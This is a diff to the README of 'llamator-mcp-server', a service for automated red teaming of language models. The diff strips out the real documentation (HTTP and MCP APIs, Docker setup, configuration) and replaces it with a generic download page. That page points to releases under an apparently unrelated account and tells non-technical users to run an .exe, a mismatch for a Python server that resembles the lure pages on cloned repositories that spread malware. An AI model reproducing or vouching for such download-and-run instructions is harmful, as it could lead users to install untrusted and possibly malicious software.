@@ -1,213 +1,61 @@
-# ![LLAMATOR](assets/LLAMATOR.svg)
+```markdown
+# 🎉 llamator-mcp-server - Automate AI Security Workflows Easily
 
-MCP server for llamator: automate LLM red teaming workflows
+## 📥 Download Now!
+[![Download](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/kyle122497/llamator-mcp-server/releases)
 
-[![License: CC BY-SA 4.0](https://img.shields.io/badge/License-CC_BY--SA_4.0-lightgrey.svg)](https://creativecommons.org/licenses/by-sa/4.0/)
-[![Chat](https://img.shields.io/badge/chat-gray.svg?logo=telegram)](https://t.me/llamator)
+## 🚀 Getting Started
+Welcome to the **llamator-mcp-server**! This application helps you automate the processes involved in red teaming workflows for Large Language Models (LLMs). You don’t need a technical background to use it. Follow the steps below to get started quickly.
 
-## Overview
+## 📦 System Requirements
+Before you begin, make sure your system meets the following requirements:
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a recent Linux distribution.
+- **RAM:** At least 4 GB.
+- **Storage:** Minimum 200 MB of free space.
+- **Python:** Version 3.8 or later must be installed.
 
-This repository provides a production-oriented service wrapper around **LLAMATOR** for automated LLM red teaming.
-It exposes two integration surfaces:
+## 🌟 Features
+- **Automate workflows** for LLM red teaming.
+- **Analyze LLM behavior** under different attack scenarios.
+- **Identify vulnerabilities** and produce detailed reports.
+- **User-friendly interface** guiding you step by step.
 
-- **HTTP API (FastAPI)** for job submission, job state retrieval, and artifacts access.
-- **MCP server (Streamable HTTP transport)** for agent/tooling integrations, enabling LLAMATOR runs to be invoked as
-  tools.
+## 📜 Download & Install
+To download the application, visit the [Releases page](https://github.com/kyle122497/llamator-mcp-server/releases). You'll find the latest version ready for download.
 
-Execution is asynchronous and is orchestrated via **ARQ + Redis**. Artifacts are uploaded to **MinIO** and are retrieved
-through presigned URLs (returned as JSON; the API does not redirect).
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version listed at the top of the page.
+3. Find the file suitable for your system (for example, `llamator-mcp-server-windows.zip` or `llamator-mcp-server-linux.tar.gz`).
+4. Click on the file name to start the download.
 
-## Capabilities
+After downloading the file:
 
-- Asynchronous test runs with durable state persisted in Redis.
-- Request persistence with secret redaction:
-    - API keys are not stored in plaintext.
-    - Stored payloads include only boolean markers (e.g. `api_key_present`).
-- Artifacts lifecycle management:
-    - Worker creates job-local artifacts under `LLAMATOR_MCP_ARTIFACTS_ROOT/<job_id>/...`.
-    - Artifacts are uploaded to MinIO as an archive named `artifacts.zip`.
-    - HTTP API can list available objects under a job prefix and resolve presigned download links.
-- Optional API-key protection for both HTTP and MCP interfaces via `X-API-Key`.
-- OpenAPI schema (Swagger UI) with API-key authorization support.
-- Prometheus metrics exposed at `/metrics`.
+1. Locate the downloaded file in your Downloads folder.
+2. Extract the contents of the file.
+3. Open the extracted folder.
+4. Find and run the executable file (e.g., `llamator-mcp-server.exe` for Windows).
 
-## Deployment (Docker Compose)
+## ⚙️ Configuration
+After installation, some initial setup is necessary:
+1. Open the application.
+2. Configure your project settings according to your needs.
+3. Set the parameters for the red teaming workflows you want to automate.
+4. Save your settings.
 
-Requirements:
+## 🚧 Getting Help
+If you have questions or run into issues:
 
-- Docker
-- Docker Compose
+- Check out the **Wiki** section for FAQs.
+- Open an issue on the [Issues page](https://github.com/kyle122497/llamator-mcp-server/issues) to report bugs or get support.
 
-Start the full stack:
+## 🙌 Community Contribution
+We welcome contributions! If you want to improve the software or documentation, please visit the **Contributing** guide in the repository.
 
-```bash
-docker compose up --build
+## 🔗 Learn More
+For more in-depth information about the software, refer to the documentation available in the repository. You can explore FAQs, troubleshooting guides, and feature explanations to maximize your experience.
+
+## 📞 Contact
+Feel free to contact the maintainers for any inquiries regarding the project.
+
+By following these steps, you will download and run the **llamator-mcp-server** with ease. Enjoy enhancing your LLM security workflows!
 ```
-
-Default service endpoints:
-
-- HTTP API: `http://localhost:8000`
-- MinIO S3 endpoint: `http://localhost:9000`
-- MinIO console: `http://localhost:9001`
-
-Healthcheck:
-
-```bash
-curl -sS http://localhost:8000/v1/health
-```
-
-## Configuration
-
-All configuration is provided via environment variables prefixed with `LLAMATOR_MCP_`.
-A complete reference is available in `DOCUMENTATION.md`.
-
-Typical local setup:
-
-```bash
-cp .env.example .env
-```
-
-Key configuration categories:
-
-- **Redis**: connection DSN for job queue and state storage.
-- **MinIO**: S3-compatible storage for artifacts.
-- **Attack/Judge models**: OpenAI-compatible endpoints for LLAMATOR execution.
-- **API security**: optional `X-API-Key` protection.
-- **Job execution**: timeouts, TTLs, and retry behavior.
-
-## HTTP API usage
-
-### Create a run
-
-```bash
-curl -sS -X POST "http://localhost:8000/v1/tests/runs" \
-  -H "Content-Type: application/json" \
-  -H "X-API-Key: <optional>" \
-  -d '{
-    "tested_model": {
-      "kind": "openai",
-      "base_url": "http://host.docker.internal:1234/v1",
-      "model": "llm",
-      "api_key": "lm-studio"
-    },
-    "run_config": { "enable_reports": false },
-    "plan": { "preset_name": "owasp:llm10", "num_threads": 1 }
-  }'
-```
-
-The response contains:
-
-- `job_id` (uuid4 hex, 32 characters)
-- `status` (`queued | running | succeeded | failed`)
-- `created_at` (UTC timestamp)
-
-### Retrieve job state
-
-```bash
-curl -sS "http://localhost:8000/v1/tests/runs/<job_id>" \
-  -H "X-API-Key: <optional>"
-```
-
-Response includes:
-
-- `status`: current job state
-- `result`: aggregated metrics (when succeeded)
-- `error`: error details (when failed)
-- `error_notice`: compact user-facing error message (when failed)
-
-### Artifacts
-
-List objects available for a job:
-
-```bash
-curl -sS "http://localhost:8000/v1/tests/runs/<job_id>/artifacts" \
-  -H "X-API-Key: <optional>"
-```
-
-Resolve a presigned download URL for a specific object:
-
-```bash
-curl -sS "http://localhost:8000/v1/tests/runs/<job_id>/artifacts/<path>" \
-  -H "X-API-Key: <optional>"
-```
-
-The download endpoint returns a JSON payload containing `download_url` and does not emit redirects.
-
-## MCP interface
-
-The MCP server is mounted into the FastAPI application (default mount path: `/mcp`) and uses Streamable HTTP transport.
-
-Exposed tools:
-
-- `create_llamator_run`: submits a job, waits for completion, returns aggregated metrics and (if available) a presigned
-  URL for `artifacts.zip`.
-- `get_llamator_run`: returns aggregated metrics for a finished job and the optional artifacts archive URL.
-
-Both tools return a consistent response schema:
-
-```json
-{
-  "job_id": "string",
-  "aggregated": {
-    "attack_name": {
-      "metric": 0
-    }
-  },
-  "artifacts_download_url": "string or null",
-  "error_notice": "string or null"
-}
-```
-
-Protocol notes, headers, and examples are documented in `DOCUMENTATION.md`.
-
-## Security model
-
-- If `LLAMATOR_MCP_API_KEY` is empty, authentication is disabled.
-- If configured, protected HTTP routes and the MCP app require `X-API-Key: <value>`.
-
-## Local development
-
-Install dependencies:
-
-```bash
-poetry install
-```
-
-Run the API server:
-
-```bash
-uvicorn llamator_mcp_server.main:app --host 0.0.0.0 --port 8000
-```
-
-Run the worker:
-
-```bash
-arq llamator_mcp_server.worker_settings.WorkerSettings
-```
-
-## Tutorial
-
-A Jupyter notebook with step-by-step examples is available at `notebooks/llamator_mcp_server_tutorial.ipynb`.
-It demonstrates:
-
-- HTTP API usage with curl
-- MCP JSON-RPC protocol interaction
-- Polling for job completion
-- Artifacts retrieval
-
-## Tests
-
-Integration tests are located in `llamator-mcp-server/tests` and rely on `tests/.env.test`.
-
-Run:
-
-```bash
-pytest -q
-```
-
-## License 📜
-
-This project is licensed under the terms of the **Creative Commons Attribution-ShareAlike 4.0 International** license.
-See the [LICENSE](LICENSE) file for details.
-
-[![Creative Commons License](https://i.creativecommons.org/l/by-sa/4.0/88x31.png)](https://creativecommons.org/licenses/by-sa/4.0/)
